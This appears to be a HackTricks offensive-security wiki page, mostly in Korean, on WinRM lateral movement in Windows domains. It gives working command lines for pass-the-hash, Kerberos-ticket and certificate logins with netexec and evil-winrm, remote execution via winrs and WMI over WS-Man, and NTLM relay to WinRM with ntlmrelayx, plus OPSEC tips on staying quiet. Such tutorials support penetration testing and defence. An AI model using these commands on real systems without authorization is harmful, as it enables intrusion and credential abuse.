# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM은 Windows 환경에서 가장 편리한 **lateral movement** 전송 방식 중 하나인데, SMB 서비스 생성 트릭 없이 **WS-Man/HTTP(S)** 를 통해 원격 shell을 제공하기 때문이다. 대상이 **5985/5986** 을 노출하고 있고, principal이 remoting 사용이 허용되어 있다면, 종종 "valid creds" 에서 "interactive shell" 로 매우 빠르게 이동할 수 있다.

**protocol/service enumeration**, listeners, WinRM 활성화, `Invoke-Command`, 그리고 일반적인 client 사용법은 다음을 확인:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- **HTTP/HTTPS** 를 사용하므로 SMB/RPC 대신 동작해서, PsExec-style execution 이 차단된 곳에서도 잘 작동하는 경우가 많다.
- **Kerberos** 와 함께 쓰면 재사용 가능한 credentials 를 대상에 보내지 않는다.
- **Windows**, **Linux**, 그리고 **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`) 에서 깔끔하게 동작한다.
- interactive PowerShell remoting 경로는 대상에서 인증된 user context 아래 **`wsmprovhost.exe`** 를 생성하는데, 이는 service-based exec 와 운영적으로 다르다.

## Access model and prerequisites

실제로 WinRM lateral movement 가 성공하려면 **세 가지**가 필요하다:

1. 대상에 **WinRM listener** (`5985`/`5986`) 와 접근을 허용하는 firewall rules 가 있어야 한다.
2. account 가 endpoint 에 **authenticate** 할 수 있어야 한다.
3. account 가 remoting session 을 **open** 할 수 있어야 한다.

이 접근 권한을 얻는 일반적인 방법:

- 대상에서 **Local Administrator** 이다.
- 최신 시스템에서는 **Remote Management Users**, 아직 그 그룹을 허용하는 시스템/components 에서는 **WinRMRemoteWMIUsers__** 의 멤버이다.
- local security descriptors / PowerShell remoting ACL 변경을 통해 위임된 명시적 remoting rights 가 있다.

이미 admin 권한이 있는 box 를 제어하고 있다면, 여기 설명된 기법을 사용해 **전체 admin group membership 없이도 WinRM access 를 위임**할 수 있다는 점을 기억하라:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos 는 hostname/FQDN** 이 필요하다. IP 로 연결하면 client 는 보통 **NTLM/Negotiate** 로 fallback 한다.
- **workgroup** 이나 cross-trust edge cases 에서는 NTLM 이 보통 **HTTPS** 또는 client 의 **TrustedHosts** 에 target 추가를 요구한다.
- workgroup 에서 **local accounts** 를 Negotiate 로 사용할 때, UAC remote restrictions 때문에 built-in Administrator account 를 사용하거나 `LocalAccountTokenFilterPolicy=1` 이 아니면 access 가 막힐 수 있다.
- PowerShell remoting 은 기본적으로 **`HTTP/<host>` SPN** 을 사용한다. 환경에서 `HTTP/<host>` 가 이미 다른 service account 에 등록되어 있으면 WinRM Kerberos 는 `0x80090322` 로 실패할 수 있다; port-qualified SPN 을 사용하거나 해당 SPN 이 존재하는 경우 **`WSMAN/<host>`** 로 전환하라.

password spraying 중에 valid credentials 를 얻었다면, WinRM 으로 검증하는 것이 shell 로 이어지는지 확인하는 가장 빠른 방법인 경우가 많다:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec for validation and one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM for interactive shells

`evil-winrm`는 **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, file transfer, 그리고 in-memory PowerShell/.NET loading을 지원하므로 Linux에서 가장 편리한 interactive option으로 남아 있습니다.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

기본 **`HTTP/<host>`** SPN이 Kerberos 실패를 일으킬 때는, 대신 **`WSMAN/<host>`** 티켓을 요청/사용해 보세요. 이는 `HTTP/<host>`가 이미 다른 서비스 계정에 연결된 강화되었거나 특이한 기업 환경에서 나타납니다.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
이것은 **RBCD / S4U** abuse 이후, 특히 일반적인 `HTTP` ticket이 아니라 **WSMAN** service ticket을 forged 했거나 요청했을 때도 유용합니다.

### Certificate-based authentication

WinRM은 **client certificate authentication**도 지원하지만, certificate는 target에서 **local account**에 mapped되어 있어야 합니다. offensive 관점에서 이는 다음과 같은 경우 중요합니다:

- WinRM에 이미 mapped된 유효한 client certificate와 private key를 stolen/exported 했을 때;
- principal에 대한 certificate를 얻기 위해 **AD CS / Pass-the-Certificate**를 abused한 뒤 다른 authentication path로 pivot할 때;
- password-based remoting을 의도적으로 피하는 environments에서 작업할 때.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM은 password/hash/Kerberos auth보다 훨씬 덜 흔하지만, 존재할 경우 password rotation을 견디는 **passwordless lateral movement** 경로를 제공할 수 있습니다.

### Python / automation with `pypsrp`

operator shell 대신 automation이 필요하다면, `pypsrp`는 Python에서 **NTLM**, **certificate auth**, **Kerberos**, **CredSSP** 지원과 함께 WinRM/PSRP를 제공합니다.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe`는 내장되어 있으며, 인터랙티브 PowerShell remoting 세션을 열지 않고 **native WinRM command execution**을 원할 때 유용합니다:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
운영상, `winrs.exe`는 일반적으로 다음과 유사한 원격 프로세스 체인을 생성합니다:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
기억해 둘 만한 내용인데, 이는 service-based exec와 interactive PSRP 세션과 다르기 때문이다.

### `winrm.cmd` / PowerShell remoting 대신 WS-Man COM

**WinRM transport**를 통해 `Enter-PSSession` 없이도 WS-Man 위에서 WMI 클래스를 호출해 실행할 수 있다. 이렇게 하면 transport는 WinRM으로 유지되지만, 원격 실행 primitive는 **WMI `Win32_Process.Create`**가 된다:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
그 접근 방식은 다음과 같은 경우 유용합니다:

- PowerShell logging이 강하게 모니터링되는 경우.
- classic PS remoting workflow는 원하지 않지만 **WinRM transport**는 원하는 경우.
- **`WSMan.Automation`** COM object를 둘러싼 custom tooling을 만들거나 사용하는 경우.

## NTLM relay to WinRM (WS-Man)

SMB relay가 signing으로 차단되고 LDAP relay가 제한될 때, **WS-Man/WinRM**은 여전히 매력적인 relay 대상이 될 수 있습니다. 최신 `ntlmrelayx.py`에는 **WinRM relay servers**가 포함되어 있으며 **`wsman://`** 또는 **`winrms://`** targets로 relay할 수 있습니다.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Two practical notes:

- Relay is most useful when the target accepts **NTLM** and the relayed principal is allowed to use WinRM.
- Recent Impacket code specifically handles **`WSMANIDENTIFY: unauthenticated`** requests so `Test-WSMan`-style probes do not break the relay flow.

For multi-hop constraints after landing a first WinRM session, check:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC and detection notes

- **Interactive PowerShell remoting** usually creates **`wsmprovhost.exe`** on the target.
- **`winrs.exe`** commonly creates **`winrshost.exe`** and then the requested child process.
- Expect **network logon** telemetry, WinRM service events, and PowerShell operational/script-block logging if you use PSRP rather than raw `cmd.exe`.
- If you only need a single command, `winrs.exe` or one-shot WinRM execution may be quieter than a long-lived interactive remoting session.
- If Kerberos is available, prefer **FQDN + Kerberos** over IP + NTLM to reduce both trust issues and awkward client-side `TrustedHosts` changes.

## References

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
